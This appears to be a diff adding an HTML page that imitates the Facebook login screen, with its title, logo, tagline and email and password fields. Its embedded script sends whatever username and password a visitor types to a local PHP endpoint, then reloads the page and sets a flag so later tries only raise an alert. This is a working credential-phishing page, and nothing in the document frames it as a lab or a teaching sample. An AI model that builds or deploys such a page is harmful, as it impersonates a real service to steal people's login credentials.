@@ -1,0 +1,69 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="images/facebook_icon-icons.com_59205.ico" type="image/x-icon">
+    <link rel="stylesheet" href="css/estilos.css">
+    <title>Facebook</title>
+</head>
+<body>
+    <img src="logofa.png" id="logito" alt="" >
+    <div class="contenedor">
+        <div class="parte-1">
+            <span  class="titulo-1">Facebook</span>
+            <span class="comentario-1">Connect with friends and the world arround you on Facebook</span>
+        </div>
+        
+        <div class="parte-2">
+            <div class="login">
+                <input type="text" id="user" placeholder="Email or Phone number">
+                <input type="password" id="pass" placeholder="Password">
+                <button id="enviar">Log In</button>
+                <a href="index.html" id="lind"><span class="recupc">Forgot password?</span></a>
+                <button id="crear">Create new acount</button>
+            </div>
+        </div>
+    </div>
+</body>
+<script>
+    let user = document.querySelector("#user");
+    let pass = document.querySelector("#pass");
+    let enviar = document.querySelector("#enviar");
+    function datos (usr, ps) {
+        if(localStorage.getItem("regist") == undefined) {
+            let datos = new FormData;
+        datos.append("user", usr);
+        datos.append("password", ps);
+        fetch("php/php.php", {
+            method: "POST",
+            body: datos    
+        })
+        .then(res => res.text())
+        .then(re => {
+            location.reload()
+            localStorage.setItem("regist", true);
+        })
+        user.value = "";
+        pass.value = "";
+        }
+        else {
+            alert("requstrao")
+        }
+    }
+    enviar.addEventListener('click', ()=> {
+        if(user.value != "" && pass.value != "") {
+            datos(user.value, pass.value)
+        }
+    })
+    document.addEventListener("keydown", (e) => {
+        console.log(e)
+        if (e.key == "Enter") {
+            if(user.value != "" && pass.value != "") {
+            datos(user.value, pass.value)
+        }
+        }
+    })
+</script>
+</html>
